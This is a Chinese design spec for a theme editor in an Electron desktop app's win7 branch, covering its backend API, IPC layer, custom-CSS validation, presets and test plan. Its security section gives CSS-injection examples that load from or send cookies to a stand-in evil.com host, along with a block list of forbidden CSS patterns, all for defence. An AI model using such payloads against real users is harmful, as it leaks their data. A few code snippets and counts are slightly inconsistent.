---
name: win7-m2-theme-editor
description: win7 M2 主题编辑器设计 spec（Full main parity + 5 套 cherry-pick 预设 + 组件拆分 i18n 命名空间 + Subagent 4-Phase 渐进式实施）
metadata:
  type: spec
  status: design
  parent_spec: 2026-06-28-win7-modules-rollout-design
  depends_on: 2026-06-28-win7-i18n-framework-design
  author: brainstorm-session-2026-06-28
  related_files:
    - backend/api/theme_router.py
    - backend/services/theme_storage.py
    - backend/schemas/theme.py
    - src/widgets/theme/ThemeProvider.tsx
    - src/widgets/theme/ThemeSelector.tsx
    - src/widgets/theme/CssThemeModal.tsx
    - src/widgets/theme/CodeMirrorThemeEditor.tsx
    - src/widgets/theme/ThemeGallery.tsx
    - src/widgets/theme/backgroundInjector.ts
    - src/widgets/theme/presets.ts
    - src/shared/api-client/themeCssClient.ts
    - src/shared/lib/theme/cssValidator.ts
    - src/shared/types/theme.ts
    - src/shared/i18n/zh.ts
    - src/shared/i18n/en.ts
    - src/app/providers/AppProviders.tsx
    - electron/preload.ts
    - electron/main.ts
---

# win7 M2 主题编辑器 Design Spec

> M2 of win7-modules-rollout。**目标：让 `release/win7` 分支拥有与 main 完全对齐的主题编辑能力(预设画廊 + 自定义 CSS 编辑 + 实时切换),实现路径 Full main parity,5 套预设 cherry-pick 自 main,Subagent 4-Phase 渐进式交付。**

## 1. Goal

让 win7 用户能:
- ✅ 在 5 套内置主题预设中切换(light / dark / ocean / forest / sunset)
- ✅ 通过 CodeMirror 6 编辑器编写自定义 CSS,实时预览
- ✅ 主题选择持久化(localStorage + backend dual-write)
- ✅ 后端 atomic JSON 存储,支持多预设管理
- ✅ 与 main API 100% 对齐,未来 main 主题相关 cherry-pick 零摩擦

不实现(YAGNI):
- ❌ 主题市场/在线下载(本期无)
- ❌ 主题分享/导出/导入(M4+ 视情况)
- ❌ 主题调度/定时切换(M3 Scheduler 范畴)
- ❌ 主题对 electron native chrome 的影响(M9 范畴)

## 2. Context

### 2.1 Win7 现状(基线 2026-06-28, HEAD 2976dc4)

- ✅ M1 i18n 框架就绪(`useI18n()` + 16 keys + 持久化),M2 直接走 `t()`
- ✅ React 18.2 + Vite + TypeScript 5.x
- ✅ Zustand 4.4.7 + react-router-dom 6.20
- ✅ 后端 FastAPI 0.85 + SQLAlchemy + SQLite(hexagonal 架构)
- ✅ py3.8 + pydantic 1.x(与 main 3.11+2.x 独立)
- ✅ electron 21.4.4(Win7 兼容)
- ❌ `src/widgets/theme/` 整个目录不存在
- ❌ `backend/services/theme_storage.py` 不存在
- ❌ `backend/api/theme_router.py` 不存在
- ❌ CodeMirror 6 依赖未装
- ❌ 主题相关 i18n 键未添加

### 2.2 main 分支实现情况(参考)

| 阶段 | main commit | win7 取舍 |
|---|---|---|
| **P1** types + 后端 | `fdc6f79` / `fe4f906` / `60e84c3` / `39f435e` / `30f0d17` / `b75725d` | **同 main**, py3.8 + pydantic 1.x 适配 |
| **P2** IPC + 注入 | `15f658d` / `d11f756` / `55632ec` | **同 main** |
| **P3** CodeMirror + 集成 | `989e912` / `c91a40a` / `a0f4eab` / `4324f0a` / `151455a` | **同 main**, CodeMirror 6 懒加载 |
| **P4** 5 套预设 | `a6b5ba8` / `97b0f6b` / `bea3616(revert)` | **Cherry-pick 5 套预设** |

### 2.3 关键不变量(从 M1 继承)

- UI 字符串禁止硬编码,必须走 `t()`
- 加新翻译键必须先改 `zh.ts` 再改 `en.ts`(TS 类型强制)
- 修改 `zh.ts/en.ts` 的 PR 必须保持两边 key 集合一致(`translations.test` 校验)
- 测试组件时若使用 `useI18n` 必须包裹 `<I18nProvider>`

## 3. Architecture(架构总览)

### 3.1 分层

```
┌─────────────────────────────────────────────────────────────────┐
│  Electron Renderer (React 18.2 + Vite)                          │
│  ┌────────────────────────────────────────────────────────────┐  │
│  │  P3-P4: UI 层                                              │  │
│  │  src/widgets/theme/                                        │  │
│  │    ThemeProvider.tsx          ← 暴露 currentTheme/preset   │  │
│  │    ThemeGallery.tsx           ← 5 套预设缩略图            │  │
│  │    ThemeSelector.tsx          ← 当前主题切换入口          │  │
│  │    CssThemeModal.tsx          ← 自定义 CSS 编辑器弹窗    │  │
│  │    CodeMirrorThemeEditor.tsx  ← CM6 编辑器(懒加载)        │  │
│  │    backgroundInjector.ts      ← CSS vars 注入 document    │  │
│  │    presets.ts                 ← 5 套预设常量(cherry-pick) │  │
│  │  src/shared/api-client/themeCssClient.ts  ← IPC 客户端    │  │
│  └────────────────────────────────────────────────────────────┘  │
│           ↑ React Context        ↑ CSS vars              ↓ IPC │
│           │ (current theme id)   │ (--color-bg, etc.)     │     │
├───────────┼──────────────────────┼──────────────────────────┤  │
│  Electron Main (electron/)                                       │
│  preload.ts: 暴露 window.electronAPI.theme.{list,get,save,delete,│
│              saveActive,loadActive,validate}                    │
│  main.ts:    注册 IPC handlers + 桥接到 backend REST            │
├───────────┼──────────────────────────────────────────────────────┤
│  Backend (FastAPI, Python 3.8 + pydantic 1.x)                    │
│  ┌────────────────────────────────────────────────────────────┐ │
│  │  P1: API 层                                                │ │
│  │  backend/api/theme_router.py  ← /api/v1/theme/{list,get,   │ │
│  │                                  save,delete,active,validate}│
│  │  backend/services/theme_storage.py  ← atomic JSON I/O      │ │
│  │  backend/schemas/theme.py  ← pydantic 1.x models           │ │
│  │  backend/data/themes.json  ← git-ignored, atomic write     │ │
│  │  backend/data/themes.defaults.json  ← 5 套预设种子(git 跟踪)│ │
│  └────────────────────────────────────────────────────────────┘ │
└─────────────────────────────────────────────────────────────────┘
```

### 3.2 4-Phase 拆分(与 Subagent 1:1 对应)

| Phase | Subagent 范围 | 关键产出 | 独立可测性 |
|---|---|---|---|
| **P1** 后端基础 | types + storage + router + schemas + tests | REST API + themes.json 持久化 | pytest 直跑,无需前端 |
| **P2** IPC + 注入 | preload + main + themeCssClient + cssValidator + backgroundInjector + tests | `window.electronAPI.theme.*` 可用 + CSS vars 实时切换 | vitest + 手动验证 |
| **P3** UI 集成 | ThemeProvider + ThemeSelector + CssThemeModal + CodeMirrorThemeEditor + tests | 主题切换 + 自定义 CSS 编辑闭环 | vitest + RTL |
| **P4** 5 套预设 | presets.ts + ThemeGallery + 5 套硬编码常量 + i18n keys + cherry-pick assets | 画廊可点选,名称/描述/封面齐全 | vitest + 视觉确认 |

### 3.3 依赖关系

```
M1 i18n (✅ 已完成) ─── 所有 Phase 都需要(theme.* 翻译键)
   ↓
P1 后端 ─── P2 IPC 需要 REST 端点存在
   ↓
P2 IPC + 注入 ─── P3 UI 需要 IPC 客户端可用
   ↓
P3 UI 集成 ─── P4 画廊需要 ThemeProvider 暴露 currentTheme/preset
```

### 3.4 关键设计约束(win7 特定)

- **py3.8 + pydantic 1.x 兼容**:所有 backend models 不用 `model_config`,改用 `Config` 类;`validator` 装饰器不传 `allow_reuse`
- **electron 21.4.4 兼容**:preload API surface 与 main 一致
- **CodeMirror 6 懒加载**:`React.lazy(() => import('./CodeMirrorThemeEditor'))`,bundle 拆 ~200KB initial
- **CSS vars 注入用 `setProperty`**:`document.documentElement.style.setProperty('--color-bg', value)`,不写 `<style>` 标签
- **localStorage 键名加 `sage.` 前缀**:`sage.theme.active`(与 main 的 `theme.active` 隔离,防命名冲突)

## 4. Components(组件清单 + 数据契约)

### 4.1 文件清单(32 处改动)

| Phase | 文件 | 行数(估) | 类型 |
|---|---|---|---|
| **P1** | `backend/api/theme_router.py` | 150 | 新建 |
| **P1** | `backend/services/theme_storage.py` | 120 | 新建 |
| **P1** | `backend/schemas/theme.py` | 60 | 新建 |
| **P1** | `backend/schemas/common.py` | 30 | 新建(ApiError 信封) |
| **P1** | `backend/data/.gitignore`(追加 themes.json) | +1 | modify |
| **P1** | `backend/data/themes.defaults.json` | 80 | 新建(5 套预设种子) |
| **P1** | `backend/data/.gitkeep` | 1 | 新建 |
| **P1** | `backend/api/__init__.py`(挂载 router) | +3 | modify |
| **P1** | `backend/tests/api/test_theme_router.py` | 200 | 新建 |
| **P1** | `backend/tests/services/test_theme_storage.py` | 150 | 新建 |
| **P1** | `backend/tests/schemas/test_theme_schemas.py` | 100 | 新建 |
| **P2** | `src/shared/api-client/themeCssClient.ts` | 80 | 新建 |
| **P2** | `src/shared/types/theme.ts` | 50 | 新建 |
| **P2** | `src/shared/types/api.ts` | 30 | 新建(ApiResponse 信封) |
| **P2** | `src/shared/lib/theme/cssValidator.ts` | 80 | 新建 |
| **P2** | `src/shared/lib/theme/__tests__/cssValidator.test.ts` | 150 | 新建 |
| **P2** | `electron/preload.ts` | +20 | modify |
| **P2** | `electron/main.ts` | +30 | modify |
| **P3** | `src/widgets/theme/ThemeProvider.tsx` | 100 | 新建 |
| **P3** | `src/widgets/theme/ThemeSelector.tsx` | 130 | 新建 |
| **P3** | `src/widgets/theme/CssThemeModal.tsx` | 180 | 新建 |
| **P3** | `src/widgets/theme/CodeMirrorThemeEditor.tsx` | 200 | 新建(懒加载) |
| **P3** | `src/widgets/theme/backgroundInjector.ts` | 50 | 新建 |
| **P3** | `src/widgets/theme/ErrorBoundary.tsx` | 50 | 新建 |
| **P3** | `src/widgets/theme/__tests__/ThemeProvider.test.tsx` | 150 | 新建 |
| **P3** | `src/widgets/theme/__tests__/ThemeSelector.test.tsx` | 120 | 新建 |
| **P3** | `src/widgets/theme/__tests__/CssThemeModal.test.tsx` | 100 | 新建 |
| **P3** | `src/widgets/theme/__tests__/backgroundInjector.test.ts` | 80 | 新建 |
| **P3** | `src/app/providers/AppProviders.tsx` | +5 | modify(挂载 ThemeProvider) |
| **P4** | `src/widgets/theme/presets.ts` | 200 | 新建(cherry-pick 5 套) |
| **P4** | `src/widgets/theme/ThemeGallery.tsx` | 150 | 新建 |
| **P4** | `src/widgets/theme/__tests__/ThemeGallery.test.tsx` | 100 | 新建 |
| **P4** | `src/widgets/theme/__tests__/presets.test.ts` | 60 | 新建 |
| **P4** | `src/shared/i18n/zh.ts` | +60 | modify(theme.* 4 个 namespace) |
| **P4** | `src/shared/i18n/en.ts` | +60 | modify |
| **P4** | `src/shared/i18n/__tests__/translations.test.ts` | +20 | modify(新 key 一致性) |

**总计:25 个新文件 + 7 个修改 ≈ 32 处改动**

### 4.2 后端 REST API 契约(py3.8 + pydantic 1.x)

```python
# backend/schemas/theme.py
from typing import Dict, List, Optional
from pydantic import BaseModel, Field, validator  # pydantic 1.x syntax

class ThemePreset(BaseModel):
    id: str = Field(..., regex=r'^[a-z0-9-]{1,32}$')
    name: str       # i18n key
    description: str  # i18n key
    cover: Optional[str] = None
    css: Optional[str] = None

class ThemeCssPayload(BaseModel):
    css: str
    vars: Dict[str, str]  # 16-var whitelist

class ActiveTheme(BaseModel):
    presetId: str
    customCss: Optional[str] = None
```

| 方法 | 路径 | 请求体 | 响应 | 错误码 |
|---|---|---|---|---|
| GET | `/api/v1/theme/list` | — | `List[ThemePreset]` | 500 |
| GET | `/api/v1/theme/get/{id}` | — | `ThemePreset` | 404, 500 |
| POST | `/api/v1/theme/save` | `ThemePreset` | `ThemePreset` | 400, 500 |
| DELETE | `/api/v1/theme/delete/{id}` | — | `{"success": true}` | 404, 500 |
| GET | `/api/v1/theme/active` | — | `ActiveTheme` | 500 |
| PUT | `/api/v1/theme/active` | `ActiveTheme` | `ActiveTheme` | 400, 500 |
| POST | `/api/v1/theme/validate` | `{"css": "..."}` | `{"valid": bool, "errors"?: List[str]}` | 200 |

### 4.3 前端 TS 类型(`src/shared/types/theme.ts`)

```typescript
export interface ThemePreset {
  id: string;
  name: string;        // i18n key
  description: string; // i18n key
  cover?: string;
  css?: string;
}

export interface ThemeCssPayload {
  css: string;
  vars: Record<string, string>;
}

export interface ActiveTheme {
  presetId: string;
  customCss?: string;
}

export interface ThemeValidationResult {
  valid: boolean;
  errors?: string[];
}
```

### 4.4 统一 API 信封(`src/shared/types/api.ts` + `backend/schemas/common.py`)

```typescript
export interface ApiResponse<T> {
  success: true;
  data: T;
} | {
  success: false;
  error: string;
  code?: string;
  details?: unknown;
}
```

```python
class ApiError(BaseModel):
    success: Literal[False] = False
    error: str
    code: Optional[str] = None
    details: Optional[Dict[str, Any]] = None
```

### 4.5 CSS 变量白名单(16 个,与 main `fe4f906` 一致)

```typescript
export const ALLOWED_CSS_VARS = [
  '--color-bg', '--color-bg-secondary', '--color-bg-tertiary',
  '--color-fg', '--color-fg-secondary', '--color-fg-muted',
  '--color-border', '--color-border-strong',
  '--color-accent', '--color-accent-hover',
  '--color-success', '--color-warning', '--color-error', '--color-info',
  '--color-link', '--color-link-hover',
] as const;

export type AllowedCssVar = typeof ALLOWED_CSS_VARS[number];
```

### 4.6 i18n 键(组件拆分命名空间)

新增到 `src/shared/i18n/zh.ts` + `en.ts`:

```typescript
// 4 个子命名空间
'theme.gallery.title': '主题画廊' / 'Theme Gallery'
'theme.gallery.subtitle': '选择一套预设,或自定义你的主题' / 'Choose a preset or customize your theme'
'theme.editor.placeholder': '/* 在此处编写 CSS,例如 :root { --color-bg: #fff; } */'
'theme.editor.save': '保存' / 'Save'
'theme.editor.cancel': '取消' / 'Cancel'
'theme.editor.validate_failed': 'CSS 校验失败:{errors}' / 'Validation failed: {errors}'
'theme.editor.load_failed': '编辑器加载失败,使用简化版' / 'Editor failed to load, using simplified version'
'theme.selector.title': '主题' / 'Theme'
'theme.selector.custom': '自定义 CSS' / 'Custom CSS'
'theme.selector.reset': '重置为默认' / 'Reset to default'
'theme.presets.light.name': '亮色' / 'Light'
'theme.presets.light.description': '清爽的浅色主题' / 'Clean light theme'
'theme.presets.dark.name': '暗色' / 'Dark'
'theme.presets.dark.description': '护眼的深色主题' / 'Easy-on-eyes dark theme'
'theme.presets.ocean.name': '海洋' / 'Ocean'
'theme.presets.ocean.description': '深邃的蓝色调' / 'Deep blue tones'
'theme.presets.forest.name': '森林' / 'Forest'
'theme.presets.forest.description': '生机盎然的绿色调' / 'Lively green tones'
'theme.presets.sunset.name': '日落' / 'Sunset'
'theme.presets.sunset.description': '温暖的橙红渐变' / 'Warm orange-red gradient'
```

总计新增 ~17 个键(4 个子 namespace)。

### 4.7 5 套预设数据结构(`src/widgets/theme/presets.ts`)

```typescript
import type { ThemePreset } from '@shared/types/theme';

export const BUILTIN_PRESETS: readonly ThemePreset[] = [
  { id: 'light',  name: 'theme.presets.light.name',  description: 'theme.presets.light.description',  cover: '/assets/themes/light.png' },
  { id: 'dark',   name: 'theme.presets.dark.name',   description: 'theme.presets.dark.description',   cover: '/assets/themes/dark.png' },
  { id: 'ocean',  name: 'theme.presets.ocean.name',  description: 'theme.presets.ocean.description',  cover: '/assets/themes/ocean.png' },
  { id: 'forest', name: 'theme.presets.forest.name', description: 'theme.presets.forest.description', cover: '/assets/themes/forest.png' },
  { id: 'sunset', name: 'theme.presets.sunset.name', description: 'theme.presets.sunset.description', cover: '/assets/themes/sunset.png' },
] as const;
```

**Cherry-pick 提取步骤(P4 subagent 阶段执行):**
1. `git show a6b5ba8:src/widgets/theme/presets.ts > /tmp/main_presets.ts`
2. `git show a6b5ba8 --stat | grep -E '\.(png|svg|webp)$'` 找 cover 资源
3. 复制 cover 到 win7 静态资源目录(实际以 main 路径为准)
4. 在 win7 `src/widgets/theme/presets.ts` 中重写,保持 5 套 `id + vars + cover` 一致

**P1/P2/P3/P4 subagent 都会**只读** main 对应 commit 来 cherry-pick 数据,不直接 merge main 的代码(避免引入 main 的依赖/路径冲突)。

## 5. Data Flow(数据流)

### 5.1 启动序列(冷启动 + 加载 active theme)

```
T+0ms:  React root render
        AppProviders 挂载顺序: QueryClient > I18nProvider > ThemeProvider > children

T+5ms:  ThemeProvider 初始化
        1. 读 localStorage['sage.theme.active'] → ActiveTheme | null
        2. 若 null:使用默认预设 'light'(无网络请求)
        3. 若有值:解析 + 立即应用 backgroundInjector.inject(preset)
        4. 触发 useEffect:异步 themeCssClient.loadActive()
           - 命中:对比 localStorage 与 backend,backend 覆盖 localStorage
           - 未命中(localStorage 有但 backend 无):用 localStorage 并写回
           - 失败(IPC 错误):保留 localStorage,console.warn,不阻塞 UI

T+20ms: 用户看到首屏(已应用 default 或 localStorage 主题)
T+50ms: IPC 异步回填完成,可能触发 setState 切换(无视觉跳变)
```

**关键决策:** ThemeProvider **不** await IPC 完成才 render。同步路径确保首屏无白屏闪烁。

### 5.2 用户从 ThemeGallery 选择预设(快乐路径)

```
User clicks card 'ocean' in ThemeGallery
   ↓
ThemeGallery.onClick({ presetId: 'ocean' })
   ↓
ThemeProvider.setPreset('ocean')
   ├─ 同步: setState({ presetId: 'ocean', customCss: undefined })
   ├─ 同步: backgroundInjector.inject(BUILTIN_PRESETS.ocean)  // CSS vars 变化
   ├─ 同步: localStorage.setItem('sage.theme.active', JSON.stringify({presetId:'ocean'}))
   └─ 异步: themeCssClient.saveActive({presetId:'ocean'})
              └─ window.electronAPI.theme.saveActive(payload)
                  └─ IPC → main.ts handler
                      └─ backend/api/theme_router.put_active(payload)
                          └─ theme_storage.save_active(payload)  // atomic JSON
                  └─ 失败: toast "已应用,云端同步失败"
```

**关键决策:** 同步链 ≤ 5ms,IPC/网络失败不影响 UI 状态。

### 5.3 用户自定义 CSS(CodeMirror 编辑 + 保存)

```
User clicks "Custom CSS" in ThemeSelector
   ↓
CssThemeModal opens
   ├─ 读取 active theme 的当前 css 字段
   ├─ CodeMirrorThemeEditor lazy load(首次需 ~50ms,缓存后 <5ms)
   ├─ 加载当前 css 到编辑器
   └─ 用户编辑 → 实时预览(防抖 300ms)
        └─ injectCustomCss(css) → document.documentElement 临时覆盖 vars
            └─ 校验失败: 编辑器下方红字 + 禁用 Save 按钮
            └─ 校验通过: 显示预览生效

User clicks Save
   ↓
ThemeProvider.applyCustomCss(presetId, css)
   ├─ 同步: setState + backgroundInjector.inject
   ├─ 同步: localStorage 写入
   └─ 异步: themeCssClient.save({ id: `${presetId}-custom`, css, ... })
              └─ POST /api/v1/theme/save → themes.json atomic write
              └─ 失败: rollback localStorage + 重新 inject 上一个 active 主题
                    + toast 错误
```

**关键决策:** Save 失败时必须 rollback 视觉状态(不能让用户以为保存了)。

### 5.4 错误路径矩阵

| 失败点 | 检测点 | 用户体验 | 数据回滚 |
|---|---|---|---|
| localStorage 写入失败(quota exceeded) | try/catch in ThemeProvider | toast: "无法保存到本地" | UI 状态保留,后台失败 |
| CSS 校验失败 | cssValidator 在编辑器中实时运行 | 编辑器红字 + Save 禁用 | N/A(未触发保存) |
| IPC 调用超时(5s) | themeCssClient timeout | toast: "云端同步失败,本地已应用" | UI 状态保留 |
| Backend 写盘失败 | theme_router 500 | toast: "保存失败,请重试" | localStorage 同步回滚 + UI 恢复 |
| Backend 返回 404(主题被外部删) | theme_router.get | 静默 fallback 到 'light' | localStorage 同步清除 + toast 提示 |
| themes.json 损坏 | theme_storage 启动时 try/except | 备份为 themes.json.bak + 重新种子 | N/A(数据恢复) |
| CodeMirror 加载失败 | ErrorBoundary in lazy import | 降级为 `<textarea>` + 提示 | N/A(不阻塞使用预设) |

### 5.5 跨 phase 集成点

```
P1 后端就绪 → 端点 /api/v1/theme/* 可用,themes.json 可读写
P2 IPC + 注入就绪 → window.electronAPI.theme.* 客户端可用,backgroundInjector 可注入
P3 ThemeProvider + UI 就绪 → 可点击 ThemeSelector 切换预设
P4 5 套预设 + Gallery 就绪 → 完整 UX:画廊 + 切换 + 编辑 + 保存
```

每个 phase 完成后,**前序 phase 已可手测**;不需等所有 phase 完成才验证。

## 6. Error Handling + Edge Cases + Security(错误处理 + 边界条件 + 安全)

### 6.1 React Error Boundary(UI 降级)

```typescript
<ThemeErrorBoundary fallback={<ThemeFallbackUI />}>
  <ThemeProvider>
    <ThemeGallery />
    <CssThemeModal />
  </ThemeProvider>
</ThemeErrorBoundary>
```

| 错误源 | 降级策略 |
|---|---|
| ThemeProvider 初始化抛错 | 强制 fallback 到 'light' 预设 + 红色横幅 "主题系统异常,已使用默认" |
| CodeMirror 懒加载失败 | 自动降级为 `<textarea>` + 提示 "高级编辑器加载失败,使用简化版" |
| backgroundInjector 抛错 | 不应用当前 CSS 变更,console.error,UI 不变 |
| ThemeGallery 渲染抛错 | 显示 "主题画廊暂不可用" + ThemeSelector 仍可用 |

### 6.2 后端错误处理模式(py3.8 + pydantic 1.x)

```python
@router.get("/get/{theme_id}", response_model=ApiResponse[ThemePreset])
async def get_theme(theme_id: str) -> ApiResponse:
    try:
        preset = theme_storage.get(theme_id)
        if not preset:
            return ApiError(error=f"Theme '{theme_id}' not found", code="THEME_NOT_FOUND")
        return ApiResponse(success=True, data=preset)
    except OSError as e:  # 文件 I/O 错误
        logger.exception("themes.json read failed")
        return ApiError(
            error="主题存储读取失败",
            code="STORAGE_READ_FAILED",
            details={"reason": str(e)} if settings.DEBUG else None
        )
    except json.JSONDecodeError:
        logger.exception("themes.json corrupted")
        return ApiError(error="主题存储已损坏,已自动恢复默认", code="STORAGE_CORRUPTED")
```

**约定:**
- 业务错误 → 返回 `ApiError`(HTTP 200,success=false)
- 系统错误 → raise `HTTPException(status_code=500, detail=...)`
- 任何 `try` 块必须 explicit handle 三类:`OSError` / `ValueError` / 通用 `Exception`
- 失败必须有 `logger.exception()`(非 `logger.error()`,保留 stack trace)

### 6.3 边界条件矩阵(10 个)

| # | 场景 | 检测点 | 行为 |
|---|---|---|---|
| 1 | 首次运行(无 themes.json) | `theme_storage._ensure_file()` | 从 `themes.defaults.json` 复制 + 写 `themes.json` |
| 2 | themes.json 损坏 | `json.load()` 抛 `JSONDecodeError` | 备份为 `themes.json.bak.{timestamp}` + 重新种子 + logger.error + toast |
| 3 | 空预设列表 | 启动时 `len(presets) == 0` | 不允许空(强制至少 1 套),re-seed + logger.warn |
| 4 | 后端端口未启 | IPC 调用 `ECONNREFUSED` | ThemeProvider 仍渲染(localStorage 兜底),toast "云端不可用,本地主题仍生效" |
| 5 | CodeMirror 加载失败 | ErrorBoundary + `lazy` 抛错 | 降级 `<textarea>` + Save 仍可用 + toast 一次 |
| 6 | localStorage quota 超限 | `setItem` 抛 `QuotaExceededError` | toast "本地存储已满,无法保存",UI 状态保留但下次启动会丢 |
| 7 | CSS vars 冲突 | 多 source 同时注入 | 优先级:用户自定义 > 主题预设 > 系统默认,`backgroundInjector.setVar()` 强制覆盖 |
| 8 | active theme 在 backend 存在但 localStorage 缺失 | IPC 启动回填 | 用 backend,本地不冲突 |
| 9 | active theme id 在 backend 不存在 | `get(theme_id)` 返回 404 | 静默 fallback 到 'light',localStorage 同步修正 + 写回 backend |
| 10 | CSS 注入后视觉无变化 | 业务不应该发生 | dev 模式 console.warn(选择性),不打扰用户 |

### 6.4 安全 — CSS 注入防护

**威胁模型:** 用户自定义 CSS 会被注入到 `document.documentElement.style`,理论上可:
1. 引入外部资源(`@import url("evil.com/x.css")`)
2. 执行脚本(`expression()`、`behavior: url()`、CSS Houdini)
3. 泄露用户隐私(`background: url('https://evil.com/track?cookie=...')`)
4. 视觉欺骗(覆盖关键 UI 元素)

**防护(在 `cssValidator.ts` 中实现):**

```typescript
const FORBIDDEN_PATTERNS = [
  /@import/i,
  /expression\s*\(/i,
  /behavior\s*:/i,
  /javascript:/i,
  /url\s*\(\s*['"]?\s*https?:/i,  // 外部 URL
  /url\s*\(\s*['"]?\s*data:/i,    // data URL
  /-moz-binding/i,                // Mozilla XBL
  /@charset/i,
];

// 白名单 vars(16 个,见 §4.5)
// 不在白名单的 --custom-var 一律拒绝
```

**额外约束:**
- 单条 CSS 行长度 ≤ 1000 字符(防 DoS)
- 总 CSS 长度 ≤ 50KB
- `:root { ... }` 之外的选择器被 strip 掉(只允许 `:root`)
- 校验通过后,使用 `CSSStyleSheet.replaceSync()`(原子替换,不闪屏)

**主进程额外防护:**
```typescript
ipcMain.handle('theme:save', async (event, payload) => {
  const validation = cssValidator.validate(payload.css);
  if (!validation.valid) {
    return { success: false, error: validation.errors.join('; '), code: 'CSS_INVALID' };
  }
  return await backendApi.save(payload);
});
```

### 6.5 日志策略

| 层 | logger | 级别 | 内容 |
|---|---|---|---|
| 前端 (TS) | `console` + sentry(若启用) | `warn` 以上 | localStorage 失败、IPC 失败、CodeMirror 失败 |
| Electron main | `electron-log` | `info` | IPC handler 调用、backend 请求 |
| Backend (Python) | `logging` (structlog) | `error` 必有 stack,`warn` 不带 | themes.json 损坏、storage I/O 失败、validation 失败 |
| **不记录:** 用户主题内容(隐私)、CSS 字符串(可能敏感) | | | |

### 6.6 重试与幂等

| 操作 | 重试策略 | 幂等性 |
|---|---|---|
| `loadActive()` 启动回填 | 失败不重试(下次启动再试) | N/A(读) |
| `saveActive()` 切换预设 | 失败不重试(toast 提示) | ✅ PUT 幂等 |
| `save(theme)` 自定义 CSS | **失败重试 1 次**(2s 后) | ✅ POST 幂等(同 id 覆盖) |
| `delete(theme_id)` | 失败不重试 | ✅ 幂等 |
| `validate(css)` | 失败不重试 | N/A(纯函数) |

## 7. Testing Strategy(测试策略)

### 7.1 覆盖率门槛

| 维度 | 目标 | 备注 |
|---|---|---|
| 语句覆盖率 (Statements) | **≥ 80%** | CLAUDE.md 强制 |
| 分支覆盖率 (Branches) | **≥ 75%** | CodeMirror 部分允许 < 80%(第三方) |
| M1 + M2 i18n keys 一致性 | **100%** | translations.test 自动校验 |
| 16-var CSS 白名单覆盖 | **100%** | cssValidator 16 个 var × {valid, invalid} = 32 case |
| REST 端点 7 个 | **100%** | happy path + 错误码各 1 case |

### 7.2 按 Phase 测试矩阵

| Phase | 新增测试文件 | 核心 case | 覆盖率目标 |
|---|---|---|---|
| **P1** | `test_theme_router.py` (~30 case)<br>`test_theme_storage.py` (~25 case)<br>`test_theme_schemas.py` (~15 case) | 7 端点 × {happy, 4xx, 5xx} + atomic write + 损坏恢复 + 并发写 + 首次种子 | ≥ 90% |
| **P2** | `cssValidator.test.ts` (~32 case)<br>`themeCssClient.test.ts` (~15 case)<br>`backgroundInjector.test.ts` (~12 case) | 16-var × valid/invalid + 6 类威胁 + IPC 成功/失败/超时 + 注入副作用 | ≥ 90% |
| **P3** | `ThemeProvider.test.tsx` (~15 case)<br>`ThemeSelector.test.tsx` (~12 case)<br>`CssThemeModal.test.tsx` (~10 case)<br>`CodeMirrorThemeEditor.test.tsx` (~6 case) | 启动序列 + 切换 + 编辑 + 保存 + rollback + 错误降级 | ≥ 80% |
| **P4** | `presets.test.ts` (~10 case)<br>`ThemeGallery.test.tsx` (~10 case)<br>`translations.test.ts`(modify) | 5 套完整 + i18n key 一致性 + 点击切换 | ≥ 85% |

### 7.3 TDD 工作流(每个 Phase 内部)

```
[1] P1 subagent 启动
[2] 先写测试: test_theme_storage.py::test_atomic_write_concurrent_fails_safely
[3] 跑测试: RED ❌
[4] 写最小实现: theme_storage.py::atomic_write()
[5] 跑测试: GREEN ✅
[6] 重构: 提取公共异常处理 + 加 typing
[7] 跑测试: 仍 GREEN ✅ + 覆盖率 ≥ 80%
[8] 重复 [2-7] 直至该 phase 所有 case GREEN
[9] 跑全量测试 + 覆盖率门禁 → commit + push
```

**M2 整体 TDD 节奏:** 每个 Phase subagent 内部 4-6 轮 RED-GREEN-IMPROVE 循环。

### 7.4 Mocking 策略

| Phase | 测试场景 | Mock 什么 | 怎么 Mock |
|---|---|---|---|
| P1 | backend API 测试 | FastAPI TestClient | `from fastapi.testclient import TestClient` |
| P1 | theme_storage 损坏恢复 | 真实文件系统(临时目录) | `tmp_path = pytest.fixture('tmp_path')` |
| P2 | cssValidator 单元测试 | 无需 mock(纯函数) | — |
| P2 | themeCssClient 测试 | `window.electronAPI.theme.*` | `vi.mock('../../electron/preload')` |
| P3 | ThemeProvider 测试 | `themeCssClient` | `vi.mock('@shared/api-client/themeCssClient')` |
| P3 | CodeMirror 懒加载 | CM6 模块 | `vi.mock('@codemirror/...')` |
| P3 | CssThemeModal | `CodeMirrorThemeEditor` | `vi.mock('../CodeMirrorThemeEditor')` |
| E2E | 启动序列 | 不 mock(真实环境) | playwright-electron 启动整个 app |

### 7.5 关键 Edge Case 测试清单

```typescript
// cssValidator.test.ts (32 case)
✓ ALLOWED_CSS_VARS 每个变量 + 合法值 → valid
✓ ALLOWED_CSS_VARS 每个变量 + 非法值 → valid(浏览器仍接受)
✓ @import url(...) → invalid,error: 'CSS_INJECTION_FORBIDDEN'
✓ expression(alert(1)) → invalid
✓ url(https://evil.com/x.css) → invalid
✓ --not-whitelisted-var: red → invalid,error: 'VAR_NOT_ALLOWED'
✓ 单行 > 1000 字符 → invalid,error: 'LINE_TOO_LONG'
✓ 总 CSS > 50KB → invalid,error: 'CSS_TOO_LARGE'
✓ :root 之外的选择器 → stripped(不报错,但生效仅 :root)
✓ 嵌套 @media → invalid(只允许顶层 :root)

// theme_storage.test.ts (pytest)
✓ 首次启动无 themes.json → 从 defaults 种子
✓ themes.json 损坏 → 备份 + re-seed
✓ 并发 atomic write → 文件锁,后者胜
✓ 写入中途 OSError → 临时文件残留清理
✓ 读 + 写同一时刻 → 读不阻塞写

// ThemeProvider.test.tsx
✓ localStorage 命中 → 同步应用 + 异步回填成功 → 无视觉变化
✓ localStorage 缺失 → 默认 light + 异步加载 → 可能有视觉变化
✓ localStorage 损坏 → 默认 light + toast "本地主题已重置"
✓ IPC 成功且与 localStorage 不一致 → 用 backend 覆盖 + 写回 localStorage
✓ IPC 失败 → 保留 localStorage + toast "云端不可用"
✓ 切换预设时 IPC 失败 → UI 状态保留 + toast
✓ 保存自定义 CSS 失败 → localStorage rollback + UI 状态恢复 + toast
```

### 7.6 lefthook pre-push hook 集成

```yaml
# lefthook.yml (追加)
pre-push:
  parallel: true
  commands:
    frontend-test-theme:
      glob: "src/widgets/theme/**"
      run: npm run test:coverage -- src/widgets/theme src/shared/lib/theme src/shared/api-client/themeCssClient.ts
    backend-test-theme:
      glob: "backend/{api,services,schemas}/theme_*"
